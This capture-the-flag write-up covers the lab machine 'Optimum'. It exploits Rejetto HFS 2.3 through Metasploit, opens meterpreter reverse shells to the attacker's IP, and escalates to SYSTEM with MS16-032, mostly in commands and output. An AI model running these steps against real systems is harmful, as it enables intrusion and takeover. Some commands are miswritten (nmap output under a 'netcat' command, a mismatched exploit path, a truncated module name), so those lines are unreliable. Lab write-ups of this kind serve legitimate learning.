### Optimum

First off, we need to figure out what this is:
`netcat -A -v 10.129.58.195`

Returns:
```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Server-Header reads HFS 2.3
HTTP-Title reads HFS
HttpFileServer is the version

So a quick google search shows that this is HttpFileServer 2.3.

Time to figure out if there's an exploit!

Firstly we start up Metasploit so we can start searching, then:

`> searchsploit HFS`

Returns us:
```
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service   | osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)             | osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure         | osx/local/35488.c
Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation  | osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution          | windows/remote/37985.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service         | linux/dos/28895.txt
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasplo | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities   | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload      | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Exec | windows/webapps/34852.txt
-------------------------------------------------------------------- ---------------------------------
```

My eyes are drawn to the lowest hanging fruit - remote command execution! 

To find out more I run:

`> searchsploit -x 39426.rb`

Giving this a read over.. This seems like something we'd like to try out!

`> search HFS`

Gives us:
```
Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```
So now we want to use the Rejetto HttpFileServer Remote Command Execution, since we've confirmed that the exploit module is available:

`> use exploit/windows/http/rejetto_hfs`

With our module loaded, we then want to see the options we have to set in order to get it to run successfully:

`msf5 exploit(windows/http/rejetto_hfs_exec) > options`

```
Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

From this we're looking at the two important ones for us: RHOST and SRVHOST.

We'll set the RHOST, which is our target: 

`> set RHOST 10.129.58.195 (The target IP)`
`> set SRVHOST 10.10.14.85 (My IP address/the listener IP address)`

Then enter in the fun command:

`> exploit`

Now we've got a shell! Lets grab some additional information on our target system:

`> getuid`
`> sysinfo`

From 'getuid' we grab:
```
Server username: OPTIMUM\kostas
```
And from 'sysinfo':
```
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```
Something that sticks out here is that the Architecture is x64, but the meterpreter is using x86/windows - not great!

So we'll use the following command:

`> background`

And put our current session in the background so we can come back to it later - although if you have to open up another session, that's OK! Sometimes they'll time out.

We want to change our Meterprefer from x86 to x64, but we still want to keep the same settings so that we're still able to get a meterpreter shell.

We'll review our current options:
```
msf5 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.58.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    10.10.14.85      yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.85      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```
From this we can see that the payload is where meterpreter comes in, and by default running x86. To change that:

`> set payload windows/x64/meterpreter/reverse_tcp`

This will change our current payload from (windows/meterpreter/reverse_tcp) to (windows/x64/meterpreter/reverse_tcp). We want to make sure that we're running things compatible so that if something does break or go wrong, at least we know we're using the proper architeture! 

Now we'll run this again using the following command:

`> exploit`

Then once we've opened a new meterpreter shell, type 'sysinfo' to confirm that the Meterpreter shell is showing as x64, instead of x86:
```
meterpreter > sysinfo

Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x64/windows
```
Great!

Now on to grabbing the user and root flags!

Lets see what we can find in our current directory:

`> ls`
```
meterpreter > ls
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2020-12-15 07:08:19 +0000  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 11:57:16 +0000  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 11:58:52 +0000  hfs.exe
100444/r--r--r--  32      fil   2017-03-18 12:13:18 +0000  user.txt.txt
```
Well, there's user.txt sitting right there! As user.txt.txt.

We want to see the contents so:

`> cat user.txt.txt`

And we've succesfully grabbed our user flag! Hooray! 

Now we just need the root.

Since we're in kostas Desktop, lets see if there's another user directory.. There is! But we cannot access it. The Administrators folder sits out of our reach with our current level of access.

Time to upgrade!

First thing we're going to do is see if our current level of access gives us the ability to escalate our privileges on this system, for that we'll utilize 'post/multi/recon/local_exploit_suggester'. 

We'll feed this in:

`> use post/multi/recon/local_exploit_suggester`

Then we'll take a look at options:
```
msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
```
Our x64 session is session 2.

You can see your session list with:

`> sessions -l`

So we'll set this to use session 2, and we want it to describe the exploits so we can see if they're viable:

`> set session 2`
`> set showdescription true`
`> run`

This gives us:
```
[*] 10.129.58.195 - Collecting local exploits for x64/windows...
[*] 10.129.58.195 - 15 exploit checks are being tried...
[+] 10.129.58.195 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
  Microsoft Windows allows for the automatic loading of a profiling 
  COM object during the launch of a CLR process based on certain 
  environment variables ostensibly to monitor execution. In this case, 
  we abuse the profiler by pointing to a payload DLL that will be 
  launched as the profiling thread. This thread will run at the 
  permission level of the calling process, so an auto-elevating 
  process will launch the DLL with elevated permissions. In this case, 
  we use gpedit.msc as the auto-elevated CLR process, but others would 
  work, too.
```
Lets try this! 

`> use exploit/windows/local/bypassuac_dotnet_profiler`

We'll check options, and it's asking for our session - remembering that we're running our x64 session as session 2:

`> set session 2`

We're ready for exploitation!

`> exploit`
```
[*] Started reverse TCP handler on 178.128.226.210:4444 
[*] UAC is Enabled, checking level...
[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
[*] Exploit completed, but no session was created.
```
Damn. Not in admins group - so we can't escalate.

So now we need to find out how to upgrade our current access to something that'll let us get into everything. Lets search exploit-db for Windows Server 2012 R2! 

After searching up 'Windows 2012 R2' on exploit-db, I've got a list of 4. One DoS, two Remote, one Local. The local being.. Privilege escalation! Exactly what I'm looking for considering I already have a shell.

This is MS16-032, and now that we know that, we want to see if Metasploit has a module to gain us access..

`> search ms16-032`
```
msf5 post(multi/recon/local_exploit_suggester) > search ms16-032

Matching Modules
================

   #  Name                                                           Disclosure Date  Rank    Check  Description
   -  ----                                                           ---------------  ----    -----  -----------
   0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation
```
Found one!

`> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`

We'll make sure that 'session' is set to '2'. That way it's using the session we want. Note that if your session expires, that's OK. Just set it back up, and check your sessions with 'sessions -l'. Then you can set your session to the appropriate session number.
```
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     178.128.226.210  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```
 So our session is set, what else are we missing?

 ### LHOST and LPORT!

 LHOST doesn't match with what we want (our machine's IP address), so:

 `> set LHOST 10.10.14.85`


But LPORT looks OK!

Except... That payload doesn't look right! 

`> set payload windows/x64/meterpreter/reverse_tcp`
```
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.85      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

That's better.

All that's left is to run it!

`> exploit`
```
[*] Started reverse TCP handler on 10.10.14.85:4444 
[+] Compressed size: 1016
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\IXQJDv.ps1...
[*] Compressing script contents...
[+] Compressed size: 3584
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1400

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1408
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

Dn9NLmLOWZ3GqLJLb7rEYdVjHPOYoVJ6
[+] Executed on target machine.
[*] Sending stage (201283 bytes) to 10.129.58.195
[*] Meterpreter session 3 opened (10.10.14.85:4444 -> 10.129.58.195:49169) at 2020-12-08 22:17:50 +0000
[+] Deleted C:\Users\kostas\AppData\Local\Temp\IXQJDv.ps1
```

Perfect! We have a SYSTEM shell.

We'll check that by accessing the local shell:
```
meterpreter > shell
Process 2348 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```
Yup! That's a system shell if I ever saw one.

Armed with this, we can now go anywhere.

We'll return back to the meterpreter shell with 'exit'.

I want to go into the Administrator folder in Users, so:

`> cd 'C:\Users\Administrator\'`
```
meterpreter > ls
Listing: C:\Users\Administrator
===============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:50 +0000  AppData
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  Application Data
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:56 +0000  Contacts
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  Cookies
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:50 +0000  Desktop
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:50 +0000  Documents
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:50 +0000  Downloads
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:50 +0000  Favorites
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:50 +0000  Links
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  Local Settings
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:50 +0000  Music
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  My Documents
100666/rw-rw-rw-  524288  fil   2017-03-18 11:52:50 +0000  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2017-03-18 11:52:51 +0000  NTUSER.DAT{8901c074-71dd-11e4-80c1-0026b94a1097}.TM.blf
100666/rw-rw-rw-  524288  fil   2017-03-18 11:52:51 +0000  NTUSER.DAT{8901c074-71dd-11e4-80c1-0026b94a1097}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2017-03-18 11:52:51 +0000  NTUSER.DAT{8901c074-71dd-11e4-80c1-0026b94a1097}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  NetHood
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:50 +0000  Pictures
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  PrintHood
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  Recent
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:50 +0000  Saved Games
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:56 +0000  Searches
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  SendTo
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  Start Menu
40777/rwxrwxrwx   0       dir   2017-03-18 11:52:51 +0000  Templates
40555/r-xr-xr-x   0       dir   2017-03-18 11:52:50 +0000  Videos
100666/rw-rw-rw-  90112   fil   2017-03-18 11:52:51 +0000  ntuser.dat.LOG1
100666/rw-rw-rw-  102400  fil   2017-03-18 11:52:51 +0000  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2017-03-18 11:52:51 +0000  ntuser.ini
'
```
As the user flag was set in the Desktop folder, we'll head there on the Administrator side - low hanging fruit check!
```
meterpreter > cd 'Desktop'
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 11:52:56 +0000  desktop.ini
100444/r--r--r--  32    fil   2017-03-18 12:13:57 +0000  root.txt
```
There it is. Now we've grabbed both flags.

This is a really old machine, but for people just learning - it's a perfectly good start. 

Thanks!
